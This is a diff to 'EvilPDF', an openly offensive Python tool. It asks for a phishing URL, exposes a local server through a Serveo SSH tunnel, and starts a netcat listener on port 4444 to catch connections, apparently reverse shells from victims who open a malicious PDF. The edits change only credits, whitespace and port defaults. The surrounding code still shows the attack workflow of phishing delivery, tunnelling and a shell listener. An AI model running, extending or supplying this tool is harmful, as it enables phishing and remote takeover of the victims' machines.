@@ -1,7 +1,7 @@
 #!/bin/bash
 # EvilPDF v1.0
-# github.com/marrocamp/evilpdf
-# modef by T1T4N1UM
+# coded by: @linux_choice
+# modified by T1T4N1UM
 
 
 import os, time, signal, sys
@@ -85,6 +85,7 @@ def banner():
  print( " \033[1;77mgithub.com/marrocamp/evilpdf\033[0m\n")
  
 def server(subdomain_resp,subdomain,paylod_port):
+
  print ("\033[1;77m[\033[0m\033[1;93m+\033[0m\033[1;77m] Starting Serveo...\033[0m\n")
  os.system('killall -2 php > /dev/null 2>&1')
  os.system('killall -9 ssh > /dev/null 2>&1')
@@ -105,6 +106,7 @@ def server(subdomain_resp,subdomain,paylod_port):
 
 
 def listener():
+
   print( "\033[1;77m[\033[0m\033[1;33m+\033[0m\033[1;77m] Listening connection:\033[0m\n")
   os.system("fuser -k 4444/tcp > /dev/null 2>&1")
   os.system("nc -lvp 4444")
@@ -158,10 +160,10 @@ def start():
  url=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Phishing URL (Default:\033[0m\033[1;77m %s \033[0m\033[1;33m): \033[0m' % (url_default))
  if url == "":
    url=url_default
- paylod_port=randint(4444 , 6500)
+ paylod_port=randint( 1 , 6500)
  paylod_port=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Serveo (Forwarding) Port (Default:\033[0m\033[1;77m %d \033[0m\033[1;33m): \033[0m' % (default_port))
  if paylod_port == '':
-   default_port1=default_port
+   paylod_port=default_port
  choose_sub=input('\033[1;33m[\033[0m\033[1;77m+\033[0m\033[1;33m] Choose subdomain? \033[0m\033[1;77m [Y/n] \033[0m\033[1;33m: \033[0m')
  if choose_sub in "Yy":
    subdomain_resp=True
